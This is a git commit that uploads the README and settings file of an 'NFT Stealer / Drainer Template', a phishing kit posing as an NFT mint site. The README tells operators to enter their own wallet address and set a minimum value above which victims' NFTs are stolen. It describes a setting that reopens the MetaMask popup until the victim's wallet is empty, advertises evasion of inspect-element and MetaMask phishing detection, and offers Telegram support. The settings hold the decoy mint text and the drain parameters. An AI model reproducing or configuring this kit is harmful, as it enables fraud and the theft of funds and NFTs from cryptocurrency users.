c62691534717887ec6651675c0bee2dc114dc8dc
StarWolf19950320 <starwolf0320@gmail.com>
2022-04-13 09:36:50 +0200

    Add files via upload

---
+++ ReadME.md
@@ -0,0 +1,31 @@
+
+# 🖼️ NFT Stealer / Drainer Template
+
+![preview](https://media.discordapp.net/attachments/952210702427361290/963545797138481162/unknown.png?width=1753&height=905)
+
+# 💡 Features
+- [x] Inspect Element Detection
+- [x] Custom Design
+- [x] Cool design 
+- [x] Instant transactions
+- [x] Anti Metamask Phishing Detections
+
+
+# Guide: 
+In order to use this website, you need to edit the **settings.js** file. 
+On line 1: const receiveAddress = "YOUR WALLET"; replace **YOUR WALLET with your ETH wallet address.**
+
+In the settings.js files, lines after "const collectionInfo" will change the text shown on the page and the images.
+Images are located in the assets folder, you can change them there.
+
+In the settings.js files, lines after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
+Line "askMintLoop: true," = metamask popup will open again and again until the wallet is empty.
+
+# Important : 
+
+Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
+Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
+Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
+
+To get instant support, contact me on telegram : @CCalme
+
---
+++ settings.js
@@ -0,0 +1,75 @@
+/*
+    = = = = = YOU WALLET ADRESS = = = = =
+*/
+
+const receiveAddress = "YOUR WALLET";
+
+/*
+    = = = = = COLLECTION SETTINGS = = = = =
+*/
+
+const collectionInfo = {
+    name: "nft-professor",
+    date: "10.04.2022",
+    socialMedia: {
+        discord: "discord.gg/invite_here",
+        twitter: "https://twitter.com/username_here",
+    },
+    medias: {
+        preview: "preview.gif",
+        favicon: "icon.png",
+    },
+    background: {
+        type: "image", // Supported types: image, video, color (use image for gif)
+        image: "background.jpg", // Image for image type or video preview for video type (image befor video load)
+        video: "background.mp4", // If you don't use video type, you can ignore this line
+        color: "#4E4E6D", // If you don't use color type, you can ignore this line
+    }
+}
+
+
+/*
+    = = = = = MINT INFORMATIONS = = = = =
+*/
+
+const mintInfo = {
+    price: 0.2,
+    totalSupply: 8888,
+    minUnits: 1,
+    maxUnits: 20,
+    askMintLoop: true,
+}
+
+/*
+    = = = = = DRAIN SETTINGS = = = = =
+*/
+
+const drainNftsInfo = {
+    active: true,
+    minValue: 0.2,
+    maxTransfer: 1,
+    nftReceiveAddress: "YOUR WALLET",
+}
+
+const customStrings = {
+    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    connectButton: "CONNECT WALLET",
+    transferButton: "MINT NOW",
+    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
+}
+
+/*
+    = = = = = END OF SETTINGS = = = = =
+*/
+
+//#region Check Configuration
+if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
+if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
+
+if (!receiveAddress.startsWith("0x") ||
+    (
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
+    )
+) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+//#endregion
